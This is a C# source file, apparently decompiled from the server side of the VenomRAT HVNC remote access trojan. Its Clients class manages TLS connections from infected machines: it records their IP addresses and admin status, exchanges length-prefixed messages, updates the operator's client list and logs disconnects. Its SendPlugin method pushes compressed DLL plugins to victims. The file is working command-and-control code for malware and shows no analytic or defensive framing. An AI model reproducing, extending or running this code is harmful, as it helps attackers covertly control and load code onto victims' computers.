using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Threading;
using System.Windows.Forms;
using VenomRAT_HVNC.Server;
using Server.MessagePack;
using VenomRAT_HVNC.Properties;
using VenomRAT_HVNC.Server.Algorithm;
using VenomRAT_HVNC.Server.Handle_Packet;
using VenomRAT_HVNC.Server.Helper;
using VenomRAT_HVNC.Server.Properties;
using Settings = VenomRAT_HVNC.Server.Settings;

namespace VenomRAT_HVNC.Server.Connection
{
    public class Clients
    {
        public Socket TcpClient { get; set; }

        public SslStream SslClient { get; set; }

        public ListViewItem LV { get; set; }

        public ListViewItem LV2 { get; set; }

        public string ID { get; set; }

        private byte[] ClientBuffer { get; set; }

        private long HeaderSize { get; set; }

        private long Offset { get; set; }

        private bool ClientBufferRecevied { get; set; }

        public object SendSync { get; set; }

        public long BytesRecevied { get; set; }

        public string Ip { get; set; }

        public bool Admin { get; set; }

        public DateTime LastPing { get; set; }

        public Clients(Socket socket)
        {
            this.SendSync = new object();
            this.TcpClient = socket;
            this.Ip = this.TcpClient.RemoteEndPoint.ToString().Split(new char[] { ':' })[0];
            this.SslClient = new SslStream(new NetworkStream(this.TcpClient, true), false);
            this.SslClient.BeginAuthenticateAsServer(Settings.ServerCertificate, false, SslProtocols.Tls, false, new AsyncCallback(this.EndAuthenticate), null);
        }

        private void EndAuthenticate(IAsyncResult ar)
        {
            try
            {
                this.SslClient.EndAuthenticateAsServer(ar);
                this.Offset = 0L;
                this.HeaderSize = 4L;
                this.ClientBuffer = new byte[this.HeaderSize];
                this.SslClient.BeginRead(this.ClientBuffer, (int)this.Offset, (int)this.HeaderSize, new AsyncCallback(this.ReadClientData), null);
            }
            catch
            {
                SslStream sslClient = this.SslClient;
                if (sslClient != null)
                {
                    sslClient.Dispose();
                }
                Socket tcpClient = this.TcpClient;
                if (tcpClient != null)
                {
                    tcpClient.Dispose();
                }
            }
        }

        public void ReadClientData(IAsyncResult ar)
        {
            try
            {
                if (!this.TcpClient.Connected)
                {
                    this.Disconnected();
                }
                else
                {
                    int num = this.SslClient.EndRead(ar);
                    if (num > 0)
                    {
                        this.HeaderSize -= (long)num;
                        this.Offset += (long)num;
                        if (!this.ClientBufferRecevied)
                        {
                            if (this.HeaderSize == 0L)
                            {
                                this.HeaderSize = (long)BitConverter.ToInt32(this.ClientBuffer, 0);
                                if (this.HeaderSize > 0L)
                                {
                                    this.ClientBuffer = new byte[this.HeaderSize];
                                    this.Offset = 0L;
                                    this.ClientBufferRecevied = true;
                                }
                            }
                            else if (this.HeaderSize < 0L)
                            {
                                this.Disconnected();
                                return;
                            }
                        }
                        else
                        {
                            object lockReceivedSendValue = Settings.LockReceivedSendValue;
                            lock (lockReceivedSendValue)
                            {
                                Settings.ReceivedValue += (long)num;
                            }
                            this.BytesRecevied += (long)num;
                            if (this.HeaderSize == 0L)
                            {
                                ThreadPool.QueueUserWorkItem(new WaitCallback(new Packet
                                {
                                    client = this,
                                    data = this.ClientBuffer
                                }.Read), null);
                                this.Offset = 0L;
                                this.HeaderSize = 4L;
                                this.ClientBuffer = new byte[this.HeaderSize];
                                this.ClientBufferRecevied = false;
                            }
                            else if (this.HeaderSize < 0L)
                            {
                                this.Disconnected();
                                return;
                            }
                        }
                        this.SslClient.BeginRead(this.ClientBuffer, (int)this.Offset, (int)this.HeaderSize, new AsyncCallback(this.ReadClientData), null);
                    }
                    else
                    {
                        this.Disconnected();
                    }
                }
            }
            catch
            {
                this.Disconnected();
            }
        }

        public void Disconnected()
        {
            if (this.LV != null)
            {
                Program.form1.Invoke(new MethodInvoker(delegate ()
                {
                    try
                    {
                        object lockListviewClients = Settings.LockListviewClients;
                        lock (lockListviewClients)
                        {
                            this.LV.Remove();
                        }
                        if (this.LV2 != null)
                        {
                            object lockListviewThumb = Settings.LockListviewThumb;
                            lock (lockListviewThumb)
                            {
                                this.LV2.Remove();
                            }
                        }
                    }
                    catch
                    {
                    }
                    new HandleLogs().Addmsg("Client " + this.Ip + " disconnected.", Color.Gainsboro);
                    TimeZoneInfo local = TimeZoneInfo.Local;
                    if (local.Id == "China Standard Time" && global::VenomRAT_HVNC.Server.Properties.Settings.Default.Notification)
                    {
                    }
                    foreach (AsyncTask asyncTask in Form1.getTasks.ToList<AsyncTask>())
                    {
                        asyncTask.doneClient.Remove(this.ID);
                    }
                }));
            }
            try
            {
                SslStream sslClient = this.SslClient;
                if (sslClient != null)
                {
                    sslClient.Dispose();
                }
                Socket tcpClient = this.TcpClient;
                if (tcpClient != null)
                {
                    tcpClient.Dispose();
                }
            }
            catch
            {
            }
        }

        public bool GetListview(string id)
        {
            foreach (object obj in Program.form1.listView44.Items)
            {
                ListViewItem listViewItem = (ListViewItem)obj;
                if (listViewItem.ToolTipText == id)
                {
                    return true;
                }
            }
            return false;
        }

        public void Send(object msg)
        {
            object sendSync = this.SendSync;
            lock (sendSync)
            {
                try
                {
                    if (!this.TcpClient.Connected)
                    {
                        this.Disconnected();
                    }
                    else if ((byte[])msg != null)
                    {
                        byte[] array = (byte[])msg;
                        byte[] bytes = BitConverter.GetBytes(array.Length);
                        this.TcpClient.Poll(-1, SelectMode.SelectWrite);
                        this.SslClient.Write(bytes, 0, bytes.Length);
                        if (array.Length > 1000000)
                        {
                            using (MemoryStream memoryStream = new MemoryStream(array))
                            {
                                memoryStream.Position = 0L;
                                byte[] array2 = new byte[50000];
                                int num;
                                while ((num = memoryStream.Read(array2, 0, array2.Length)) > 0)
                                {
                                    this.TcpClient.Poll(-1, SelectMode.SelectWrite);
                                    this.SslClient.Write(array2, 0, num);
                                    object lockReceivedSendValue = Settings.LockReceivedSendValue;
                                    lock (lockReceivedSendValue)
                                    {
                                        Settings.SentValue += (long)num;
                                    }
                                }
                                goto IL_15B;
                            }
                        }
                        this.TcpClient.Poll(-1, SelectMode.SelectWrite);
                        this.SslClient.Write(array, 0, array.Length);
                        this.SslClient.Flush();
                        object lockReceivedSendValue2 = Settings.LockReceivedSendValue;
                        lock (lockReceivedSendValue2)
                        {
                            Settings.SentValue += (long)array.Length;
                        }
                    IL_15B:;
                    }
                }
                catch
                {
                    this.Disconnected();
                }
            }
        }

        public void SendPlugin(string hash)
        {
            try
            {
                foreach (string text in Directory.GetFiles("Plugins", "*.dll", SearchOption.TopDirectoryOnly))
                {
                    if (hash == GetHash.GetChecksum(text))
                    {
                        MsgPack msgPack = new MsgPack();
                        msgPack.ForcePathObject("Pac_ket").SetAsString("save_Plugin");
                        msgPack.ForcePathObject("Dll").SetAsBytes(Zip.Compress(File.ReadAllBytes(text)));
                        msgPack.ForcePathObject("Hash").SetAsString(GetHash.GetChecksum(text));
                        ThreadPool.QueueUserWorkItem(new WaitCallback(this.Send), msgPack.Encode2Bytes());
                        new HandleLogs().Addmsg("Plugin " + Path.GetFileName(text) + " Sent to " + this.Ip, Color.Gainsboro);
                        break;
                    }
                }
            }
            catch (Exception ex)
            {
                new HandleLogs().Addmsg("Clinet " + this.Ip + " " + ex.Message, Color.Gainsboro);
            }
        }
    }
}
